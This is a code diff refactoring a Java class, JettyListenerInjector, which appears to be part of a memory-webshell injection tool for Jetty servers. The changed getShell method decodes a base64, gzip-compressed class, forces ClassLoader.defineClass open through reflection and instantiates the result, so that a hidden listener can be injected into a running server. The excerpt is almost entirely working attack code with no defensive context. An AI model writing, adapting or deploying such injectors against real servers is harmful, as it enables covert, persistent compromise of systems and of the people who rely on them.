@@ -108,26 +108,21 @@ public class JettyListenerInjector {
         throw new Exception("HttpConnection not found");
     }
 
-    private Object getShell(Object context) {
-        Object listener = null;
+    @SuppressWarnings("all")
+    private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            listener = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
-            try {
-                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
-                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                listener = clazz.newInstance();
-            } catch (Throwable e1) {
-                e1.printStackTrace();
-            }
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+            return clazz.newInstance();
         }
-        return listener;
     }
 
     public static void inject(Object context, Object listener) throws Exception {
@@ -172,7 +167,6 @@ public class JettyListenerInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -180,16 +174,13 @@ public class JettyListenerInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
